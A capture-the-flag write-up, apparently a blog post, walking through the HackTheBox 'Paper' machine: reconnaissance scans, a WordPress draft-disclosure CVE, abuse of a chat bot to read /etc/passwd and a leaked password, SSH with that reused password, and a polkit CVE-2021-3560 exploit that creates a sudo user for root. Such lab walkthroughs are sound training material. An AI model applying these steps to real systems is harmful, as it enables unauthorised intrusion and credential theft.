---
title: "HackTheBox Paper Write-Up"
date: 2022-06-24
slug: hackthebox-paper-write-up
excerpt: "A full walkthrough of the Paper machine (easy) on HackTheBox: leaking WordPress secret drafts, a chat-bot file disclosure, and a polkit CVE for root."
source: https://medium.com/@NicPWNs/hackthebox-paper-write-up-b77d4c2989d7?source=rss-57a2a039424d------2
tags: ["hackthebox"]
---

[![HackTheBox profile badge](https://www.hackthebox.com/badge/image/72382)](https://app.hackthebox.com/users/72382)

This is my write-up for the Paper machine on HackTheBox that just retired! Here I detail the penetration testing steps taken to scan, exploit, and privilege escalate on this target machine. This box is special because it makes use of an exploit I’ve developed in my [UNICORD](https://unicord.dev/) project. This machine is categorized as *easy* difficulty and was retired on June 18th, 2022.

## Paper Summary

![HackTheBox Paper machine avatar](/writeups/hackthebox-paper-write-up/img-1.png)

## Target Information

[**Machine Page**](https://app.hackthebox.com/machines/paper)  
**IP Address:** 10.10.11.143  
**Hostname:** paper.htb

## Synopsis

A hidden hostname must be discovered to access a WordPress site running on the target. The WordPress core version is vulnerable to disclose drafts from editors that disclose another hidden hostname and website. The next website contains an open chat application with a bot that can be used to disclose files, including a password. This password is reused to allow for SSH access. The system is vulnerable to a policy kit CVE that allows for the creation of a new sudo user for full root access.

## Scanning

## Nmap

Nmap scans show SSH open on port 22/tcp, HTTP open on port 80/tcp, and HTTPS open on port 443/tcp.

```bash
# nmap -sV -sC -p- 10.10.11.143
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-19 22:47 GMT
Nmap scan report for 10.10.11.143
Host is up (0.061s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods:
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.97 seconds
```

## HTTP/S (port 80/tcp & 443/tcp)

The website on the two web ports is a basic HTTP server test page.

![Basic HTTP server test page on HTTP/S.](/writeups/hackthebox-paper-write-up/img-2.png)

*Basic HTTP server test page on HTTP/S.*

## Nikto

Nikto scans of the website don’t show anything significant.

```bash
# nikto --host http://10.10.11.143
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.143
+ Target Hostname:    10.10.11.143
+ Target Port:        80
+ Start Time:         2022-06-19 22:47:41 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-backend-server' found, with contents: office.paper
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
^Y+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8698 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-06-19 22:56:59 (GMT0) (558 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Gobuster

Gobuster scans also don’t show anything significant on the site.

```bash
# gobuster dir -u http://10.10.11.143/ -w /usr/share/wordlists/dirpwn.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.143/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirpwn.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/19 22:48:01 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/manual               (Status: 301) [Size: 235] [--> http://10.10.11.143/manual/]
/manual               (Status: 301) [Size: 235] [--> http://10.10.11.143/manual/]
```

## Curl

Perhaps there is a different hostname we should be using to access a different site? We can check the server’s response headers with Curl. It shows us there is a different host named office.paper.

```bash
# curl --head http://10.10.11.143/
HTTP/1.1 403 Forbidden
Date: Sun, 19 Jun 2022 22:50:02 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8
```

## Edit /etc/hosts

To view the site at the newly found hostname, office.paper should be added to /etc/hosts.

```bash
# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.143    office.paper
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## Office.Paper

The website at office.paper looks different and looks like a blog. At the bottom of the page it states that it is "Powered by WordPress".

![WordPress site at office.paper.](/writeups/hackthebox-paper-write-up/img-3.png)

*WordPress site at office.paper.*

## WPscan

WPscan shows us that the target WordPress site is running WordPress core version 5.2.3 which is vulnerable.

```bash
# wpscan --url http://office.paper/ --enumerate u,ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[+] URL: http://office.paper/ [10.10.11.143]
[+] Started: Sun Jun 19 22:53:56 2022
Interesting Finding(s):
[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2021-07-17T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'
[+] Enumerating All Plugins (via Passive Methods)
[i] No plugins Found.
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==============================================================================> (10 / 10) 100.00% Time: 00:00:01
[i] User(s) Identified:
[+] prisonmike
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
[+] nick
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
[+] creedthoughts
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
[+] Finished: Sun Jun 19 22:54:01 2022
[+] Requests Done: 15
[+] Cached Requests: 49
[+] Data Sent: 4.008 KB
[+] Data Received: 18.204 KB
[+] Memory used: 229.914 MB
[+] Elapsed time: 00:00:05
```

## Exploit

## CVE-2019–17671

WordPress version 5.2.3 is vulnerable to this [basic proof-of-concept exploit](https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2). So visiting the below URL discloses a note from the editors that reveals another hostname and site.

[http://office.paper/?static=1](http://office.paper/?static=1)

![Hidden notes from WordPress editor.](/writeups/hackthebox-paper-write-up/img-4.png)

*Hidden notes from WordPress editor.*

## Edit /etc/hosts

The /etc/hosts file needs to be edited again to add chat.office.paper to the file in order to visit it.

```bash
# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.143    office.paper chat.office.paper
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
```

## Rocket Chat

The link provided by the WordPress site leads to a Rocket Chat application.

[http://chat.office.paper/register/8qozr226AhkCHZdyY](http://chat.office.paper/register/8qozr226AhkCHZdyY)

![Rocket Chat registration page.](/writeups/hackthebox-paper-write-up/img-5.png)

*Rocket Chat registration page.*

Registration is open for the application so registering and logging in works just fine.

![First look at Rocket Chat application.](/writeups/hackthebox-paper-write-up/img-6.png)

*First look at Rocket Chat application.*

There’s not much to see at first, but then eventually a #general channel pops up with some chat messages, including some from a bot called Recyclops.

![Instructions for using the Recyclops bot in Rocket Chat in the general chat.](/writeups/hackthebox-paper-write-up/img-7.png)

*Instructions for using the Recyclops bot in Rocket Chat in the general chat.*

The bot states that it can print and list files on the localhost. Surely this can be used to find a password for access. A first test of /etc/passwd works!

![Recyclops bot printing /etc/passwd.](/writeups/hackthebox-paper-write-up/img-8.png)

*Recyclops bot printing /etc/passwd.*

Knowing the bot needs some credentials to login itself, these are the credentials we hunt for. After looking around for a bit we find them!

![Recyclops bot printing environment variable.](/writeups/hackthebox-paper-write-up/img-9.png)

*Recyclops bot printing environment variable.*

Lucky for us, this password of Queenofblad3s!23 is reused and the username of dwight from /etc/passwd can be used for SSH access!

```bash
# ssh dwight@office.paper
dwight@office.paper's password:
Activate the web console with: systemctl enable --now cockpit.socket
Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$
```

## User.txt

The user.txt flag is then easily available in the dwight user's home directory.

```
[dwight@paper ~]$ ls
bot_restart.sh  hubot  sales  user.txt
```

## Enumeration

## LinPEAS

The go-to Linux privilege escalation script LinPEAS should help identify any easy paths on this system where no others were obvious. Download and transfer the script to the target and run it. LinPEAS finds that the machine should be vulnerable to CVE-2021-3560.

```
[dwight@paper nicpwns]$ ./linpeas.sh 
--- SNIP ---
    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |
    |---------------------------------------------------------------------------|
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter   :     @carlospolopm                           |
    |         Respect on HTB      :     SirBroccoli                             |
    |---------------------------------------------------------------------------|
    |                                 Thank you!                                |
    \---------------------------------------------------------------------------/
          linpeas-ng by carlospolop
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMagenta: Your username
 Starting linpeas. Caching Writable Folders...
                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
OS: Linux version 4.18.0-348.7.1.el8_5.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-4) (GCC)) #1 SMP Wed Dec 22 13:25:12 UTC 2021
User & Groups: uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
Hostname: paper
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
                                        ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.18.0-348.7.1.el8_5.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-4) (GCC)) #1 SMP Wed Dec 22 13:25:12 UTC 2021
lsb_release Not Found
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.29
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560
```

## Root

Now we need to exploit CVE-2021-3560 for privilege escalation. I have a project called [UNICORD](https://unicord.dev/): Unified Cyber Open-source Research and Development. In this project, me and a partner develop open-source exploits. CVE-2021-3560 is one of the vulnerabilities we have developed an easy-to-use exploit for, so I will be using it here. It can be downloaded from [GitHub here](https://github.com/UNICORDev/exploit-CVE-2021-3560). Transfer the exploit script to the target and run it. A custom username can be provided. A custom password can also be provided, which I did not do here. The script creates a new privileged user for us!

![Executing UNCORD CVE-2021–3560 exploit script for a new sudo user.](/writeups/hackthebox-paper-write-up/img-10.png)

*Executing UNICORD CVE-2021–3560 exploit script for a new sudo user.*

## Root.txt

Simply switch to this new user and you will see that the new user is in the privileged wheel group on the system. It can then be used to escalate to full root privileges with sudo su. You can now view the contents of the root.txt flag! You may need to be quick with this because the box regularly deletes extraneous users added using the exploit.

```
[dwight@paper nicpwns]$ su nicpwns
Password:
[nicpwns@paper nicpwns]$ id
uid=1005(nicpwns) gid=1005(nicpwns) groups=1005(nicpwns),10(wheel)
[nicpwns@paper nicpwns]$ sudo su
[root@paper nicpwns]# cat /root/root.txt
ba249807e708bc4adf7bf1a6b3f348f8
```

## Loot

Other than the points on HackTheBox, the lessons learned are the real treasures for this box.

1.  CVEs! Not all systems on HackTheBox are going to be directly vulnerable to specific CVEs with related exploits, but when they are they are very easy to research about to take advantage of them.

[![HackTheBox profile badge](https://www.hackthebox.com/badge/image/72382)](https://app.hackthebox.com/users/72382)

Found this helpful? Drop some [respect](https://app.hackthebox.com/users/72382) on my HackTheBox profile!

Thank you for reading my write-up for the Paper machine on HackTheBox. Be sure to check out my other write-ups for [HackTheBox](/notes?tag=hackthebox)!
